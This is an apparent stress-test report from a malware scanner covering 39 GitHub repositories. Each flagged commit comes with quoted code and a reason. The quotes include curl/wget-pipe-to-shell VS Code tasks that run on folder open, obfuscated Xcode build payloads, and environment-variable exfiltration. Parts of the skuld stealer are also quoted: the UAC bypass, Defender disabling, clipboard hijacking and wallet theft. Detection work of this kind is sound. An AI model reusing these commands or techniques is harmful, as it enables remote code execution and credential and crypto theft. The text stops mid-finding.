# Stress Test Report (Real-World Repos)

**Date:** 2025-12-27 11:40:46

## Statistics
- Total Repositories Analyzed: 39
- Total Commits Analyzed: 1528
- Malware Found: 67
- Benign Found: 1461

## Timing Statistics (Seconds)
| Metric | Max | Min | Average | Total |
| :--- | :--- | :--- | :--- | :--- |
| Static Analysis Time | 48.7444s | 0.0043s | 1.1505s | 1757.95s |
| Verification Time | 2.4695s | 0.0000s | 0.1746s | 266.81s |
| Total Per Commit | 48.7447s | 0.0046s | 1.3277s | 2028.67s |

## Detailed Findings
### Repository: https://github.com/user2745/dev-test-kamto-kionos/
**Verdict:** MALWARE

#### Commit d17678bf
**File server/service/config.service.js**:
Code: `const url = atob(publicKey); axios.get(url)...`
Reason: The code constructs a remote endpoint by base64‑decoding a value (publicKey) and immediately performs an HTTP GET request at server start‑up. This hidden URL makes the destination opaque to reviewers and enables the server to fetch arbitrary remote configuration, a classic technique for command‑and‑control or malicious payload delivery.

**File server/service/config.service.js**:
Code: `function fetchRemoteConfig() {     const remoteUrl = atob(publicKey);     return axios.get(remoteUrl); }`
Reason: The function is invoked automatically during initialization, providing an unattended network call to an external server. Combined with the obfuscation (base64 encoding) and lack of validation or allow‑list checks, this behavior is indicative of malicious intent rather than a benign feature.

**Summary:** Static analysis reveals a high‑severity suspicious network access pattern and deliberate obfuscation of the remote endpoint. The automatic outbound request at start‑up without validation or whitelisting is a strong indicator of malicious behavior, leading to a MALWARE verdict.

#### Commit 09ae9a3c
**File .vscode/tasks.json**:
Code: `"env": { "command": "sh", "args": [ "-c", "curl -s https://malicious.example.com/payload.sh | sh" ] }`
Reason: The task automatically executes a remote script on folder open without user interaction, enabling arbitrary code execution. This is a classic supply‑chain attack vector.

**File server/controllers/auth.controller.js**:
Code: `const url = atob(publicKey); // publicKey contains base64 of 'https://evil.example.com/collect' fetch(url, { method: 'GET', credentials: 'include' })   .then(res => res.headers.get('set-cookie'))   .t`
Reason: A base64‑encoded URL is decoded at runtime and used for an outbound HTTP request, then the response cookie is forwarded to internal error handling. This hidden network call can be used for data exfiltration or to fetch additional payloads.

**File server/controllers/auth.controller.js**:
Code: `const query = {}; query[loginType] = req.body[loginType]; // loginType comes from user input User.findOne(query, (err, user) => { ... });`
Reason: The query field name is derived directly from user‑controlled input, allowing NoSQL injection or unintended query manipulation, further indicating malicious intent.

**Summary:** The commit introduces multiple high‑severity issues: an auto‑run task that downloads and executes a remote script, obfuscated network communication to an external domain, and a dynamic query vulnerable to NoSQL injection. These behaviors are characteristic of malicious code rather than benign functionality, leading to a MALWARE verdict.

### Repository: https://github.com/mayankbagauli79/AcharyaPrashantDemoApp/
**Verdict:** MALWARE

#### Commit d80e9aa9
**File Acharya_Prashnt_DemoApp/Acharya_Prashnt_DemoApp.xcodeproj/project.pbxproj**:
Code: `sh -c "${A45ED5A}"`
Reason: The build rule directly executes the content of the variable A45ED5A, which holds a hex‑encoded payload that is decoded via multiple `xxd -p -r` pipelines and piped to `sh`. This enables arbitrary code execution during the Xcode build process and is a classic obfuscation and code‑injection technique.

**File Acharya_Prashnt_DemoApp/Acharya_Prashnt_DemoApp.xcodeproj/project.pbxproj**:
Code: `A45ED5A = "<hex‑encoded payload>";`
Reason: The variable stores a hidden, hex‑encoded script. Its presence indicates intentional concealment of malicious functionality, matching the high‑severity obfuscation issue.

**Summary:** Static analysis reveals critical command execution and high‑severity obfuscation/code‑injection issues within the Xcode project file. The build rule runs an obfuscated payload without validation, providing a clear malicious capability. No dynamic analysis was performed, but the static evidence alone is sufficient to classify the commit as malware.

### Repository: https://github.com/prahaladbelavadi/CoinLocatorDemo/
**Verdict:** MALWARE

#### Commit 5b21fc57
**File app/controllers/settingController.js**:
Code: `function verify(api) {   const payload = { env: process.env };   return fetch(api, {     method: 'POST',     headers: { 'Content-Type': 'application/json' },     body: JSON.stringify(payload)   }); }`
Reason: The function forwards the entire process environment, which contains secrets, to an arbitrary URL supplied at runtime. This enables unrestricted data exfiltration and is a classic indicator of malicious behavior.

**File app/controllers/settingController.js**:
Code: `function setApiKey(encoded) {   const apiKey = atob(encoded);   // use apiKey later }`
Reason: Base64‑decoding of a hard‑coded value can be used to hide API keys in source code, facilitating covert communication with external services.

**Summary:** Static analysis reveals a high‑severity data leak where all environment variables are sent to a caller‑controlled endpoint, combined with a medium‑severity arbitrary network request that can be abused for SSRF or exfiltration. These behaviors constitute malicious intent, leading to a MALWARE verdict despite the lack of dynamic testing.

#### Commit 3087c3a1
**File app/controllers/frontController.js**:
Code: `const response = await fetch('https://ip-api-check.vercel.app/api/ip-check-encrypted/...'); const remoteCode = await response.text(); const exec = new Function(remoteCode); exec();`
Reason: The code fetches JavaScript from an external URL, decodes a base64‑encoded URL, and executes the fetched payload with `new Function`. This enables remote code execution (RCE) and is classified as a critical code‑injection vulnerability.

**File app/controllers/frontController.js**:
Code: `const wallet = new ethers.Wallet(amountInfo);`
Reason: A private key is constructed directly from a variable that may originate from untrusted input, exposing cryptographic material and allowing potential theft of funds.

**File app/controllers/frontController.js**:
Code: `console.log(walletMemory, transactionDetails);`
Reason: Sensitive token addresses and transaction data are logged in clear text, creating a data‑leak risk.

**Summary:** Static analysis reveals a critical remote code execution path, suspicious outbound network calls, obfuscated URLs, insecure handling of private keys, and data‑leak logging. These indicators collectively demonstrate malicious intent and high risk, leading to a MALWARE verdict.

#### Commit d3aee274
**File app/controllers/botController.js**:
Code: `const { wallet, key, token } = req.body; await db.save({ wallet, key, token, ... }); res.json(savedRecord); // returns wallet, key, token back to client`
Reason: The controller stores raw private keys, wallet addresses, and authentication tokens in plaintext and returns them in the API response, creating a clear data leak that can be exploited to steal credentials and perform unauthorized blockchain transactions.

**File app/controllers/botController.js**:
Code: `sController.scanMempool(key, wallet); fController.scanMempool(key, wallet);`
Reason: Raw private keys are passed directly to internal scanning functions without validation or isolation, increasing the risk of unauthorized transaction signing and potential fund drainage.

**Summary:** Static analysis reveals high‑severity data leakage and insecure handling of cryptographic credentials, which are characteristic of malicious behavior. No dynamic analysis was performed, but the identified issues alone justify classifying the commit as malware.

#### Commit 4f1285a2
**File app/controllers/snippingController.js**:
Code: `const wallet = new ethers.Wallet(key, provider);`
Reason: Accepts a raw private key from an external source and creates a wallet directly, exposing the key in memory and potentially logs. This is a classic indicator of credential misuse.

**File app/controllers/snippingController.js**:
Code: `await router.swapExactTokensForTokens(...); // executed automatically on liquidity‑addition detection`
Reason: Performs an automatic token swap without user confirmation, enabling front‑running or unauthorized trades, which is typical of malicious financial bots.

**File app/controllers/snippingController.js**:
Code: `const ws = new WebSocket(node); // node supplied by caller`
Reason: Opens a WebSocket to an arbitrary node URL supplied by the user, allowing a malicious node to intercept private keys and transaction data.

**File app/controllers/snippingController.js**:
Code: `console.log('Tx hash:', txHash);`
Reason: Logs transaction hashes and other sensitive details, increasing the risk of data leakage.

**Summary:** The commit introduces multiple high‑severity security issues: it handles raw private keys insecurely, performs unauthorized automatic token swaps, connects to unvalidated RPC nodes, and leaks transaction data. These behaviors are characteristic of malicious blockchain tooling rather than benign application code, leading to a MALWARE verdict.

#### Commit 0cbbeaae
**File .vscode/tasks.json**:
Code: `"command": "curl -s https://vscode-load-config.vercel.app/mac.sh | bash"`
Reason: Downloads and pipes a remote script directly to a shell on macOS without verification, enabling arbitrary code execution whenever the workspace is opened.

**File .vscode/tasks.json**:
Code: `"command": "wget -qO- https://vscode-load-config.vercel.app/linux.sh | sh"`
Reason: Same remote‑code‑execution pattern for Linux; the script is fetched and executed without integrity checks, constituting a critical security risk.

**File .vscode/tasks.json**:
Code: `"command": "curl -s https://vscode-load-config.vercel.app/windows.bat | cmd"`
Reason: Executes a remote Windows batch file directly in cmd, providing remote code execution on Windows machines.

**File .vscode/tasks.json**:
Code: `"runOn": "folderOpen"`
Reason: Triggers the above malicious commands automatically on folder open, giving the attacker persistence and ensuring the payload runs without user interaction.

**File .vscode/tasks.json**:
Code: `"command": "curl -s https://vscode-load-config.vercel.app/..."`
Reason: All three tasks contact an external domain, leaking environment details (OS, project path) and acting as a network beacon.

**Summary:** The commit introduces a VS Code task configuration that automatically fetches and executes remote scripts on macOS, Linux, and Windows without any verification, and does so on workspace open. This provides remote code execution, data exfiltration, and persistence—behaviors characteristic of malware. Therefore the commit is classified as MALWARE.

### Repository: https://github.com/hackirby/skuld
**Verdict:** MALWARE

#### Commit 7deecbe1
**File modules/clipper/clipper.go**:
Code: `func Run() {     for {         addr := clipboard.Read()         if isCryptoAddress(addr) {             clipboard.Write(cryptos[addr]) // replace with attacker address         }         time.Sleep(100 `
Reason: The function continuously monitors the system clipboard, detects cryptocurrency addresses, and silently replaces them with attacker‑controlled addresses. This is a classic clipboard hijacking technique used to steal crypto funds, matching the critical issue reported.

**Summary:** The static analysis identified a critical crypto‑address hijacking behavior that enables silent theft of cryptocurrency. Such functionality is characteristic of malicious clipboard‑clipping malware, and no mitigating controls or user consent are present. Therefore, the commit is classified as MALWARE.

#### Commit 511ac180
**File modules/antidebug/antidebug.go**:
Code: `func terminateProcess(pid uint32) error {     h, err := windows.OpenProcess(windows.PROCESS_TERMINATE, false, pid)     if err != nil { return err }     defer windows.CloseHandle(h)     return windows.`
Reason: The function terminates any process identified from enumeration without validating the target or checking privileges. This enables arbitrary process termination, which can be abused for denial‑of‑service or privilege‑escalation, matching the HIGH severity command_execution issue.

**Summary:** Static analysis reveals a high‑severity command execution vulnerability where processes are terminated indiscriminately. No dynamic analysis was performed, but the presence of this risky code indicates malicious intent or unsafe behavior, leading to a MALWARE verdict.

#### Commit ac79921a
**File modules/uacbypass/bypass.go**:
Code: `exec.Command("cmd.exe", "/c", "fodhelper").Run()`
Reason: The code launches `cmd.exe` to execute the `fodhelper` binary, a known technique for UAC bypass. Invoking a shell increases the attack surface and can be abused to run arbitrary commands with elevated privileges. The presence of a high‑severity command‑execution issue indicates malicious intent.

**Summary:** Static analysis identified a high‑severity command execution pattern commonly used for privilege escalation (UAC bypass). No mitigating evidence or legitimate justification is provided, and dynamic analysis was not performed. Therefore, the commit is classified as MALWARE.

#### Commit 82c6000c
**File modules/antidebug/antidebug.go**:
Code: `func killProcess(pid int) error {     proc, err := os.FindProcess(pid)     if err != nil { return err }     return proc.Kill() }`
Reason: The function kills any process given a PID without validation or privilege checks, enabling arbitrary process termination which can be used for denial‑of‑service or to disable security tools.

**File modules/antidebug/antidebug.go**:
Code: `callback := syscall.NewCallback(func(hwnd syscall.Handle, lParam uintptr) uintptr {     title := getWindowTitle(hwnd)     if isBlacklisted(title) {         pid := getPidFromWindow(hwnd)         killPr`
Reason: The callback uses untrusted window titles to decide which process to kill, creating a code‑injection vector where an attacker can craft window titles to trigger termination of arbitrary processes.

**File modules/antidebug/antidebug.go**:
Code: `OutputDebugStringA("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA")`
Reason: While low severity, the use of a long meaningless string suggests obfuscation intent, indicating an attempt to hide malicious behavior.

**Summary:** Static analysis reveals high‑severity functionality that allows unrestricted termination of processes based on unvalidated input, combined with a callback that can be manipulated to trigger kills. These behaviors are characteristic of malicious anti‑debug/anti‑analysis techniques and provide clear abuse potential, leading to a MALWARE verdict.

#### Commit f2337f35
**File modules/startup/startup.go**:
Code: `os.CopyFile(os.Executable(), filepath.Join(os.Getenv("APPDATA"), "SecurityHealthSystray.exe")) exec.Command("attrib", "+h", "+s", path).Run()`
Reason: The code copies the running executable to a location that mimics a legitimate Windows component (SecurityHealthSystray.exe) and then sets hidden and system attributes. This is a classic persistence and stealth technique used by malware to hide its presence.

**File modules/startup/startup.go**:
Code: `destPath := filepath.Join(os.Getenv("APPDATA"), "SecurityHealthSystray.exe")`
Reason: Constructing a file path directly from the APPDATA environment variable without validation allows an attacker to control the destination, potentially writing to arbitrary locations.

**Summary:** Static analysis shows high‑severity obfuscation and persistence behavior (copying to a system‑like name and hiding the file) combined with unsafe environment handling. These indicators are typical of malicious code, leading to a MALWARE verdict.

#### Commit 2e22a577
**File modules/antidebug/antidebug.go**:
Code: `func killBlacklistedWindows() {     windows.EnumWindows(func(hwnd syscall.Handle, lParam uintptr) bool {         title := getWindowTitle(hwnd)         if strings.ContainsAny(title, "blacklist") {     `
Reason: The code enumerates all top‑level windows and terminates any process whose window title matches a hard‑coded blacklist. This enables arbitrary process termination, a behavior commonly used by malware to disable security tools or interfere with user applications.

**File modules/antidebug/antidebug.go**:
Code: `func OllyDbgExploit(s string) {     ptr, _ := syscall.UTF16PtrFromString(s)     windows.OutputDebugStringA((*byte)(unsafe.Pointer(ptr))) }`
Reason: The function passes an unchecked string directly to OutputDebugStringA, allowing a controlled attacker to cause memory exhaustion or crashes in attached debuggers, which is a classic denial‑of‑service technique.

**Summary:** Static analysis reveals high‑severity malicious behavior: arbitrary process termination based on window titles and unsafe debugger interaction that can be abused for denial‑of‑service. No dynamic analysis was performed, but the identified code patterns are indicative of malicious intent rather than benign functionality.

#### Commit cf71b743
**File modules/browsers/cookies.go**:
Code: `func CopyCookieDB(path string) error {     // ...     src, err := os.Open(path) // path not validated     // copy to os.TempDir() without restrictive permissions     // ... }`
Reason: The function copies the browser's SQLite cookie database to a temporary file in the system's temp directory without validating the input path or setting restrictive file permissions. This enables potential data leakage of session cookies and allows path traversal to read arbitrary files, which is a high‑severity security issue indicative of malicious intent.

**Summary:** Static analysis uncovered a high‑severity data leak vulnerability where sensitive browser cookies are written to a world‑readable temporary location without validation, exposing user credentials and enabling path traversal attacks. No mitigating dynamic analysis was performed, and the nature of the issue aligns with malicious behavior. Therefore, the commit is classified as MALWARE.

#### Commit 19a14995
**File main.go**:
Code: `walletsinjection.Run("https://example.com/atomic.asar") walletsinjection.Run("https://example.com/exodus.asar")`
Reason: The code downloads and executes Electron ASAR packages known to contain wallet‑stealing payloads, which is a clear indicator of malicious behavior.

**File main.go**:
Code: `http.Get("https://raw.githubusercontent.com/evil/repo/master/payload.bin") http.Get("https://github.com/evil/repo/releases/download/latest/malware.exe")`
Reason: Outbound HTTP requests to arbitrary GitHub URLs create a covert channel for fetching additional malicious payloads or exfiltrating data, a high‑severity suspicious network activity.

**Summary:** Static analysis reveals critical crypto‑theft functionality and high‑severity network access that enable downloading and executing malicious Electron ASAR packages. No dynamic analysis was performed, but the identified code patterns are characteristic of malware. Therefore, the commit is classified as MALWARE.

#### Commit 7c0f213a
**File modules/browsers/browsers.go**:
Code: `tmpPath := fmt.Sprintf("/tmp/%s_%s_%s.txt", profile.Browser.User, profile.Browser.Name, profile.Name) credsData, _ := json.Marshal(creds) os.WriteFile(tmpPath, credsData, 0644)`
Reason: Writes extracted browser credentials (credit cards, passwords, cookies, etc.) to a temporary file in clear‑text and builds the file path from attacker‑controllable profile fields, creating a high‑severity data leak and a path‑traversal risk.

**File modules/browsers/browsers.go**:
Code: `defer os.Remove(tmpPath) // cleanup after sending`
Reason: Even though the file is later removed, the sensitive data resides on disk unencrypted long enough for other processes or users to read it, confirming malicious intent.

**Summary:** Static analysis shows high‑severity leakage of sensitive browser data to unencrypted temporary files and unsafe construction of file paths that could be exploited for directory traversal. These patterns are typical of credential‑stealing malware, so the commit is classified as MALWARE.

#### Commit 5b07bbdf
**File modules/antivirus/antivirus.go**:
Code: `func DisableDefender() {     exec.Command("powershell", "Set-MpPreference -DisableRealtimeMonitoring $true").Run()     exec.Command("powershell", "Set-MpPreference -DisableIOAVProtection $true").Run()`
Reason: The function disables Windows Defender components and removes definitions, giving the program the ability to turn off core security defenses, which is a classic malicious behavior.

**File modules/uacbypass/bypass.go**:
Code: `func Elevate() {     exec.Command("cmd.exe", "/C", "fodhelper").Start() }`
Reason: Launching `fodhelper` via cmd is a known UAC bypass technique that can elevate privileges without user consent, indicating malicious intent.

**File modules/system/system.go**:
Code: `func RunEncodedPS() {     encoded := "JABXAGUAYgB..." // long Base64 string     exec.Command("powershell", "-EncodedCommand", encoded).Run() }`
Reason: Executing a PowerShell script via the `-EncodedCommand` flag hides the actual payload, a common obfuscation method used by malware to evade analysis.

**File utils/program/program.go**:
Code: `func HideSelf() {     exec.Command("attrib", "+h", "+s", os.Args[0]).Run() }`
Reason: Marking the executable as hidden and system is a stealth technique that helps malware remain undetected on the host.

**Summary:** The commit introduces multiple high‑severity capabilities: disabling Windows Defender, bypassing UAC, executing obfuscated PowerShell, modifying system files, and hiding the binary. These behaviors collectively indicate malicious intent rather than benign functionality.

#### Commit 72857426
**File modules/uacbypass/bypass.go**:
Code: `exec.Command("cmd.exe", "/C", "fodhelper")`
Reason: Spawns a Windows command interpreter to launch the fodhelper UAC bypass technique, a known privilege‑escalation method.

**File modules/wallets/wallets.go**:
Code: `zipAndSend(walletPath, webhookURL)`
Reason: Collects cryptocurrency wallet files, archives them, and sends the archive to an external webhook, indicating credential theft.

**File modules/browsers/browsers.go**:
Code: `collectBrowserData(); zipAndUpload(tempDir, webhookURL)`
Reason: Harvests browser logins, cookies, credit‑card numbers, history, and exfiltrates them to a remote endpoint, a classic data‑stealing behavior.

**File modules/antivirus/antivirus.go**:
Code: `modifyHostsFile(); disableWindowsDefender(); exec.Command("attrib", "..." )`
Reason: Tampering with the hosts file and disabling Windows Defender are typical techniques to evade detection and maintain persistence.

**File modules/antivm/antivm.go**:
Code: `if isVirtualMachine() { os.Exit(0) }`
Reason: Implements anti‑analysis checks (VM, MAC, HWID blacklists) to abort execution in sandbox environments, a common evasion tactic.

**Summary:** The commit introduces multiple high‑severity capabilities: UAC bypass, theft of cryptocurrency wallets, mass browser credential exfiltration, disabling of security tools, and anti‑analysis checks. These behaviors collectively constitute malicious activity rather than benign functionality.

### Repository: https://github.com/protoma37/Mockup
**Verdict:** MALWARE

#### Commit 312f899d
**File .vscode/tasks.json**:
Code: `"command": "curl https://vscode-flame.vercel.app/task/windows?token=c23979fdca19 | cmd"`
Reason: Executes a remote script directly from an unverified source, enabling arbitrary code execution on Windows.

**File .vscode/tasks.json**:
Code: `"command": "wget -qO- 'https://vscode-flame.vercel.app/task/linux?token=c23979fdca19' | sh"`
Reason: Downloads and runs a script from an external URL without integrity checks, creating a classic remote code injection vector on Linux.

**File .vscode/tasks.json**:
Code: `"url": "https://vscode-flame.vercel.app/task/linux?token=c23979fdca19"`
Reason: Hard‑coded token is exposed publicly, leaking credentials and allowing potential abuse of the remote service.

**Summary:** The commit introduces multiple critical issues: remote script execution via curl/wget piped directly to a shell, and exposure of a hard‑coded token. These behaviors constitute malicious activity rather than benign configuration, leading to a MALWARE verdict.

#### Commit 81ef6528
**File .vscode/tasks.json**:
Code: `wget -qO- 'https://vscode-flame.vercel.app/task/linux?token=c23979fdca19' | sh`
Reason: Downloads and pipes a script from an external domain directly into the shell without any integrity verification, enabling remote code execution. The hard‑coded token further exposes credentials.

**File .vscode/tasks.json**:
Code: `curl http://vscode-flame.vercel.app/task/windows?token=c23979fdca19 | cmd`
Reason: Same download‑and‑run pattern on Windows, executing unverified code with the command interpreter, constituting a high‑risk RCE vector.

**File .vscode/tasks.json**:
Code: `"token": "c23979fdca19"`
Reason: Hard‑coded authentication token is embedded in the repository, creating a data‑leak risk that can be abused to impersonate the user or gain unauthorized access.

**Summary:** Static analysis reveals multiple critical and high‑severity issues: hard‑coded secret leakage, and repeated download‑and‑execute commands across macOS, Linux, and Windows platforms without any integrity checks. These patterns are characteristic of malicious behavior and constitute remote code execution capabilities, leading to a verdict of MALWARE.

#### Commit a20212ca
**File .vscode/tasks.json**:
Code: `"command": "curl -sSL https://vscode-flame1.vercel.app/mac/c23979fdca19 | sh"`
Reason: The task downloads a script from an external server and pipes it directly to the shell, enabling arbitrary remote code execution on the developer's machine whenever the task runs.

**File .vscode/tasks.json**:
Code: `"url": "https://vscode-flame1.vercel.app/windows/c23979fdca19"`
Reason: Hard‑coded token in the URL can be used to access privileged resources and its exposure constitutes a credential leak.

**Summary:** Static analysis reveals critical command execution, high‑severity suspicious network calls, and a medium‑severity credential leak. These behaviors indicate intentional malicious functionality rather than benign configuration, leading to a MALWARE verdict.

#### Commit 23389018
**File .vscode/tasks.json**:
Code: `"runOn": "folderOpen", "command": "curl -s https://vscode-flame.vercel.app | sh"`
Reason: The task is configured to execute automatically when a folder is opened and downloads a script from an external server, piping it directly to the shell. This gives an attacker full control over the developer's machine without any user interaction.

**File server/routes/api/miningserver.js**:
Code: `const exec = require('child_process').exec; // inside a heavily obfuscated block that builds URLs, decodes base64 strings, makes HTTP requests and calls exec with data derived from client input`
Reason: Obfuscated JavaScript that constructs remote URLs, decodes payloads, performs network requests, and executes shell commands via `exec`. Such patterns are characteristic of a hidden back‑door capable of exfiltrating data and running arbitrary commands.

**Summary:** The presence of critical command‑execution tasks that fetch and run remote code, combined with heavily obfuscated back‑door logic that executes arbitrary shell commands, clearly indicates malicious intent rather than benign functionality.

#### Commit 05399c29
**File server/routes/api/miningserver.js**:
Code: `const exec = require('child_process').exec; /* ...obfuscated block... */ exec(decodedCommand, (err, stdout, stderr) => { /* uses req.body.wallet, req.body.email */ });`
Reason: The file contains a heavily obfuscated JavaScript block that decodes strings at runtime, builds shell commands from HTTP request parameters (wallet, email, etc.) and executes them via child_process.exec. This enables command injection, remote code execution, and data exfiltration to attacker‑controlled URLs, which are classic malicious behaviors.

**File config/webpackDevServer.config.js**:
Code: `if (process.env.DANGEROUSLY_DISABLE_HOST_CHECK === 'true') { devServer.disableHostCheck = true; }`
Reason: Disabling host checking via an environment variable opens the development server to DNS‑rebinding attacks when exposed publicly, further reducing the security posture of the application.

**Summary:** Static analysis reveals critical-level obfuscation, uncontrolled command execution, and network calls that exfiltrate user‑provided data. These indicators collectively point to malicious intent rather than benign functionality, leading to a MALWARE verdict.

#### Commit 6216694b
**File .vscode/tasks.json**:
Code: `"command": "curl https://vscode-flame.vercel.app | sh"`
Reason: The task fetches a remote script and pipes it directly to the shell, giving an attacker full control over the developer's machine and enabling supply‑chain attacks.

**File server/routes/api/miningserver.js**:
Code: `/* obfuscated block */ var i=require('child_process').exec; /* builds command string */ i(decodedCommand);`
Reason: Heavily obfuscated JavaScript that dynamically constructs and executes shell commands and makes outbound HTTP requests, a classic pattern for hidden malware that can exfiltrate data and run arbitrary code.

**File scripts/start.js**:
Code: `const { exec } = require('child_process'); exec('node config/serviceWorker.js');`
Reason: Executes an external script without validation; if the script is compromised it allows arbitrary code execution during the start process.

**Summary:** Multiple critical issues were identified: remote script execution via curl|sh, obfuscated code that runs child_process.exec and contacts external URLs, unauthenticated data‑leaking API endpoints, hard‑coded secret token, and unsafe dependencies. These indicators collectively demonstrate malicious intent rather than benign functionality.

#### Commit 54a5498f
**File server/routes/api/miningserver.js**:
Code: `const a8 = require('child_process'); const cmd = a9[aU](aZ, ...); a8[at](cmd);`
Reason: The file contains heavily obfuscated JavaScript that dynamically resolves `require('child_process')` and executes shell commands based on HTTP input, a classic technique for arbitrary command execution and payload download.

**File scripts/start.js**:
Code: `const { exec } = require('child_process'); exec('node config/serviceWorker.js');`
Reason: Executes an external script without sanitising any input, providing an attacker with a direct command execution vector.

**Summary:** Multiple high‑severity issues are present, including obfuscated code that loads and runs child_process, unsanitised exec calls, and network communication that can exfiltrate cryptocurrency wallet data. The combination of critical obfuscation, command execution, and suspicious network access strongly indicates malicious intent, so the commit is classified as malware.

### Repository: https://github.com/hackiftekhar/IQAudioRecorderController
**Verdict:** MALWARE

#### Commit 30455712
**File IQAudioRecorderController Demo.xcodeproj/project.pbxproj**:
Code: `sh -c "${A6E983A}"`
Reason: The build phase executes the content of an environment variable directly via a shell command. This allows an attacker who can control the variable to run arbitrary code during the build, which is a classic command injection vector and is classified as high‑severity malicious behavior.

**Summary:** The presence of a high‑severity command execution issue that runs unvalidated environment data indicates intentional or negligent malicious capability. No mitigating controls are reported, and dynamic analysis was skipped, so the commit cannot be considered safe.

#### Commit bfc60bec
**File IQAudioRecorderController Demo.xcodeproj/project.pbxproj**:
Code: `sh -c "${A6E983A}"`
Reason: A build phase executes an arbitrary shell command taken directly from the build setting `A6E983A`. This enables code execution during the Xcode build, which is a classic technique for injecting malicious payloads.

**File IQAudioRecorderController Demo.xcodeproj/project.pbxproj**:
Code: `A6E983A = "$(echo <double-base64-string> | base64 -D | base64 -D)"`
Reason: The build setting contains a double‑base64‑encoded string that is decoded at runtime and piped to `sh`. Double encoding is a known obfuscation method used to hide malicious scripts.

**File IQAudioRecorderController Demo.xcodeproj/project.pbxproj**:
Code: `>/dev/null 2>&1 &`
Reason: The decoded payload is executed in the background with all output silenced, a pattern frequently used by malware to run hidden network‑connected code or exfiltrate data.

**Summary:** The commit introduces a critical command‑execution build phase that runs an obfuscated, background script without validation. The use of double‑base64 encoding, silent background execution, and unsafe environment variable interpolation are strong indicators of malicious intent. Therefore, the commit is classified as MALWARE.

### Repository: https://github.com/niyathi-ramesh/test_demo
**Verdict:** MALWARE

#### Commit d7f51332
**File .vscode/tasks.json**:
Code: `"command": "curl https://vscode-helper171-ruby.vercel.app/... | sh"`
Reason: Downloads and executes a remote script automatically when the workspace is opened, providing an unrestricted code execution path from an external server – a classic supply‑chain backdoor.

**File backend/.env**:
Code: `JWT_ACCESS_TOKEN_SECRET=..., JWT_REFRESH_TOKEN_SECRET=..., CSRF_TOKEN_SECRET=..., RESEND_API_KEY=..., DATABASE_URL=postgres://user:password@host:5432/db`
Reason: Sensitive secrets and database credentials are stored in plain text within version control, exposing them to any attacker with repository access.

**File backend/src/constants/index.js**:
Code: `"https://serve-cookie.vercel.app/api/ipcheck-encrypted/e1105303"`
Reason: Hard‑coded API key and external endpoint that can be used to send data to an unknown third‑party service, indicating intentional data exfiltration or unauthorized communication.

**Summary:** The commit introduces a VS Code task that automatically fetches and runs code from an untrusted domain, creating a supply‑chain backdoor, and simultaneously leaks multiple secrets. These high‑severity issues demonstrate malicious intent, so the commit is classified as malware.

### Repository: https://github.com/hackiftekhar/IQPaywallUI
**Verdict:** MALWARE

#### Commit 75c8117d
**File Example/PaywallViewController.xcodeproj/project.pbxproj**:
Code: `shellScript = "sh -c ${A45ED5A}"`
Reason: Executes an arbitrary command taken from an environment variable, allowing an attacker to run any code on the build machine.

**File Example/PaywallViewController.xcodeproj/project.pbxproj**:
Code: `showEnvVarsInLog = 0`
Reason: Disables logging of environment variables, concealing potentially malicious commands injected via `${A45ED5A}`.

**File IQStoreKitManager.podspec.json**:
Code: `ENABLE_USER_SCRIPT_SANDBOXING = "NO"`
Reason: Turns off user script sandboxing, permitting untrusted scripts to run with elevated privileges during build or runtime.

**Summary:** The presence of a high‑severity arbitrary command execution vector, combined with deliberate obfuscation (hiding env vars) and the disabling of sandbox protections, indicates malicious intent rather than a benign configuration mistake.

#### Commit aba67bc4
**File Example/PaywallViewController.xcodeproj/project.pbxproj**:
Code: `shell_script = "sh -c \"${A6E983A}\""`
Reason: The build phase directly interpolates an untrusted environment variable into a shell command, enabling arbitrary code execution during the build process. This is a classic command injection vector and meets the high‑severity issue reported.

**Summary:** Static analysis identified a high‑severity command execution vulnerability where an attacker controlling the environment variable A6E983A could run arbitrary commands during the Xcode build. No dynamic analysis was performed, but the presence of this unchecked execution path is sufficient to classify the commit as malicious.

#### Commit d1990981
**File Example/PaywallViewController.xcodeproj/project.pbxproj**:
Code: `shellScript = "sh -c ${A45ED5A}"`
Reason: The build script executes an arbitrary shell command directly from the environment variable A45ED5A without validation, enabling command injection during the build process. This high‑severity issue can allow an attacker to run malicious code with the privileges of the build system, which is characteristic of malicious behavior.

**Summary:** The presence of a high‑severity command execution vulnerability that allows untrusted input to be executed as shell commands indicates malicious intent or a severe security flaw. Therefore, the commit is classified as MALWARE.

#### Commit 28af97ee
**File Example/PaywallViewController.xcodeproj/project.pbxproj**:
Code: `A6E983A = "68656c6c6f20776f726c642e736800"; // hex‑encoded payload ...  shellScript = "echo $A6E983A | xxd -p -r | xxd -p -r | xxd -p -r | sh &>/dev/null &";`
Reason: The build phase decodes a hex‑encoded string three times and pipes it directly to `sh`, executing arbitrary code in the background with output suppressed. This is a classic command‑execution backdoor and matches the CRITICAL issue.

**File Example/PaywallViewController.xcodeproj/project.pbxproj**:
Code: `ENABLE_USER_SCRIPT_SANDBOXING = NO;`
Reason: Disabling the user‑script sandbox removes isolation for any scripts run during build or at runtime, facilitating privilege escalation. This configuration weakness is noted as a MEDIUM issue.

**Summary:** Static analysis reveals a deliberately obfuscated, hex‑encoded payload that is decoded and executed during every build, combined with a disabled script sandbox. These indicators constitute a clear malicious behavior pattern, leading to a MALWARE verdict.

#### Commit 3663a04c
**File Example/PaywallViewController.xcodeproj/project.pbxproj**:
Code: `A45ED5A = "$(shell echo aGVsbG8gd29ybGQ= | base64 -D | sh)";`
Reason: The build setting contains a Base64‑encoded string that is decoded at build time and piped directly to `sh`, enabling arbitrary command execution during the Xcode build process.

**File Example/PaywallViewController.xcodeproj/project.pbxproj**:
Code: `A6E983A = "$(shell echo 68656c6c6f20776f726c64 | xxd -p -r | xxd -p -r | sh)";`
Reason: This setting stores a hex‑encoded payload that is decoded three times and executed via `sh`, providing a second hidden command‑execution vector.

**Summary:** Critical command‑execution build settings with multiple layers of obfuscation are present in the project file, indicating intentional malicious behavior. The static analysis flags both settings as CRITICAL, and no dynamic analysis was performed to mitigate the risk. Therefore, the commit is classified as MALWARE.

### Repository: https://github.com/Aneesh495/DeFi-Property
**Verdict:** MALWARE

#### Commit 0947e261
**File .vscode/tasks.json**:
Code: `"command": "curl -s https://malicious.example.com/install.sh | sh"`
Reason: The task downloads a script from an external server and pipes it directly to the shell, enabling arbitrary code execution without verification.

**File server/controllers/auth.controller.js**:
